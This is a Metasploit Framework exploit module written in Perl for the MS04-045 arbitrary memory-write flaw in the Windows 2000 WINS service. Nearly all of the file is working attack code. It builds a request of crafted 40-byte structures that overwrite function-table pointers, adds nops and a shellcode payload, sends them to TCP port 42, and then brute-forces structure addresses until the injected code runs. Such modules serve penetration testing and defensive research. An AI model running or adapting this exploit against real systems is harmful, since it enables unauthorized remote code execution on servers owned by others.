
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
	'INT3'	=> [0, 'Switch to a payload of x86 debug interrupts'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'process' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space'  => 4000,
                     'BadChars'  => '',
					 'Keys'      => ['+ws2ord'],
					 
					 'PrependEncoder' =>			 
						# Patch up the WSApSetPostRoutine stub...
						"\x60\xb8\x00\x0f\x02\x00\x8b\x10\xb9\x1e\xeb\xfe\x00\x39\xca\x75".
						"\x04\x61\xc2\x08\x00\x89\x08\xcc",					  
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service, this vulnerability
        was originally found by Immunity.
    }),
                
    'Refs'  =>   [  
                 #   ['OSVDB',   5248],
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 FnTable Brute', 0x05391eac],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}


sub Replicate {
	my $self = shift;
	my $targ = shift;
	my $what = shift;

	# alignment magic only allows 8 bytes of contiguous data
	my $data = pack('V10',
		0x41414141,
		$what,
		$targ - 0x48,
		$what,
		$what,
		0x33333333,
		0x43434343,
		0x44444444,
		0x45454545,
		0x46464646,
	);
	
	return $data;
}

#		0x41414141,
#		$what,
#		$targ - 0x48,
#		$what,
#		$what,
#		0x33333333,
#		0x43434343,
##		0x44444444,
#		0x45454545,
#		0x46464646,

# alternative - results in where to what :/
#	my $data = pack('V10',
#		$what,			# D
#		$what,			# A
#		$targ - 0x48,	# B 
#		$what,			# C
#		$what,			# D
#		0x41414141,
#		0x42424242,
#		$what,			# A
#		$targ - 0x48,	# B
#		$what,			# C
#	);

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    my $target_name = $self->GetVar('NBNAME');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $base = $target->[1];
	my $boom = $base + 44000;
	my $req;
	
	my @targets;

	$self->PrintLine(sprintf("[*] Using target return address of 0x%.8x", $boom));

	# Contiguous target ranges need to be in descending order...
	
	# Since these functions can be called at any time, write down the entire
	# table as fast as we can, to prevent the payload pointer from being used
	# as the where address (ie. corrupt our payload).


	push @targets, 0x750417c4; #SP4
	push @targets, 0x750417ac; #SP0
	push @targets, 0x750417c4; #SP1
	push @targets, 0x750407c4; #SP2
	push @targets, 0x750417c4; #SP4	
	
	
	# wins.exe function table (SP0 -> SP3)
	for (my $start = 0x500; $start >= 0x100; $start -= 8) {
	#	push @targets, 0x1025000 + $start;

	}
	
	# wins.exe function table (SP4)
	for (my $start = 0x500; $start >= 0x100; $start -= 8) {
	#	push @targets, 0x1024000 + $start;	
	}

	# ws2_32 pointers (too dangerous to use, but work for non-winsock shellcode)
	#push @targets, 0x750417ac; #SP0
	#push @targets, 0x750417c4; #SP1
	#push @targets, 0x750407c4; #SP2
	#push @targets, 0x750417c4; #SP4
		
	
	# Fake target needed to supply what address of last target in the chain
	push @targets, 0xd00df00d;



	# Each valid base pointer, but invalid structure, results in a new structure
	# being added to the base pointer. These structures are 40 bytes long. 
	
	# We can guarantee that our data will always be aligned at 40 byte boundaries,
	# so we generate a set of structures that wrap into each other and will always
	# have (40 * count) + 4 pointing to the where pointer. 	
	
	##
	# Step 1
	# ======
	#
	# Pad the beginning of the request with 200 40-byte structures with benign data.
	# This will let us attack a server that has already had the base address grown
	# by up to 100 structures.
	#
	##
	
	# Prevent the base from growing by using a valid address
	# 0x20000 = global process information segment
	$req = $self->Replicate(0x00020fe4 - 4, unpack('V', 'MSF!')) x 200;
	
	# This should always point at the first where address in the padding buffer
	my $brute_base = $base + (199 * 40) + 4;
	# XXX 100 == production

	$self->PrintLine(sprintf("[*] The brute force base address is 0x%.8x", $brute_base));
		
	##
	# Step 2
	# ======
	#
	# Assume that our data starts at BASE + 100 * 40. This should always be the case
	# as long less than 100 exceptions have already occured in the wins.exe process.
	# Create structures that will iterate thorugh all of the target addreses. We will
	# later scan through these structures with additional requests.
	#
	##	
	
	# Iterate through all target addresses, adding a structure to the request for
	# each one of them. Since the first eight bytes of the target address will be
	# overwritten by a dword and then the next target address, we will write to 
	# eight bytes before the target and only increment by eight byte chunks. 
	
	foreach my $targ (@targets) {
		$req .= $self->Replicate($targ - 8, $boom);
	}


	##
	# Step 3
	# ======
	#
	# Determine how much space is left to fill between the brute force structures and
	# the beginning of the payload itself. Fill in this data and then append as many
	# bytes of nops as we account for in padding structures. Finally, append our 
	# payload to the end of these nops.
	#
	##


	my $diff = 40000 - length($req);

	if ($diff <= 0) {
		$self->PrintLine("[*] Internal error, brute force buffer is too large.");
		return;
	}

	$req .= "\xcc" x $diff;
	$req .= $self->MakeNops(100 * 40);
	$req .= $shellcode;
	$req .= ("END!" x 256);

	
	##
	# Step 4
	# ======
	#
	# Place our request into memory, using an invalid structure pointer.
	#
	##		
	
	my $pkt = pack('NNN', length($req) - 8, -1, 0xdeadface). $req;
	$self->PrintLine("[*] Initializing the attack...");
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);



	##
	# Step 5
	# ======
	#
	# Brute force through our structure list, starting at the heap base plus the padding
	# offset, plus 4. Increment this pointer by 40 bytes until we run out of addresses
	# or we get a shell. 
	#
	##		
		
	my $brute = $brute_base;
	my $brute_max = $brute_base + (100 * 40) + (scalar(@targets) * 40) + 4000;
	
	$self->PrintLine("[*] Starting brute force, this can take a few minutes...");
	
	while ($brute < $brute_max)
	{

		my $pkt = pack('NNN', 8, -1, $brute);
		
		$self->PrintLine(sprintf("[*] Targeting structure at 0x%.8x of 0x%.8x...", $brute, $brute_max));

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
			sleep(1);
			next;
    	}

		$s->Send($pkt);	
		$brute += 40;
		select(undef, undef, undef, 0.10);
	}



	##
	# Step 6
	# ======
	#
	# The function table has been completely overwritten by this point, however we still
	# need to wait for one of these functions to be called. Sadly, I have yet to figure out
	# how to trigger these besides just waiting around and knocking on the service for a
	# minute or two...
	#
	##		
		
	$self->PrintLine("[*] Waiting for function pointer to be called (3 minutes max)...");
	for (1 .. 18) {
		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);
		$s->Send(pack('NNN', 8, -1, 0xdeadbeef));
		sleep(10);
		$s->Close;
	}

	$self->PrintLine("[*] Exploit failed, ");
	return;
}


1;

